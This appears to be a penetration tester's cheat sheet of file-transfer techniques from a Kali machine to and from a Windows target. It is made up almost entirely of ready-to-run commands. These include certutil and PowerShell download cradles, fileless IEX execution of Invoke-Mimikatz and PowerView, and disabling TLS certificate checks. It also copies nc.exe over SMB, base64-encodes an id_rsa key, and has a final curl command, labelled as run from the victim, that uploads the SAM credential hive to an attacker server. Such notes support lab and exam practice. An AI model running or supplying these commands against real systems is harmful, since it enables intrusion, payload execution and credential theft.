# Transferring Files (Windows)

#### Python Server + Certutil

On Kali:
```shell
python3 -m http.server 80
```

On Windows:

```Shell
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
```

#### Base64 Encode/Decode
On Kali:
```bash
md5sum id_rsa #take note of the hash value of the file

cat id_rsa | base64 -w 0;echo 
```

On Windows:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64 ENCODE>"))

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 #verify md5 hash
```


#### Powershell Web Downloads

###### File Download
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

###### Fileless Download
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```


#### Powershell Invoke Web Request
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```


#### Bypass Download Commands

###### Internet Explorer Bypass
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

###### Untrusted SSL/TLS Certificate
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


#### SMB Transfer

###### Start SMB Server
On Kali:
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On Windows:
```bash
net use n: \\192.168.220.133\share /user:test test

copy n:\nc.exe
```


#### FTP Transfer

###### Start FTP Server
On Kali:
```shell
sudo python3 -m pyftpdlib --port 21
```

On Powershell:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

On Shell:
```shell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
```

#### XfreeRDP
```bash
xfreerdp /drive:kali,.
```


#### Upload Server
```bash
python -m venv myfirstproject
source myfirstproject/bin/activate
pip install uploadserver
python -m uploadserver 80

#command to upload from victim
curl.exe -X POST http://192.168.45.202/upload -F "files=@C:\sam.save"
```
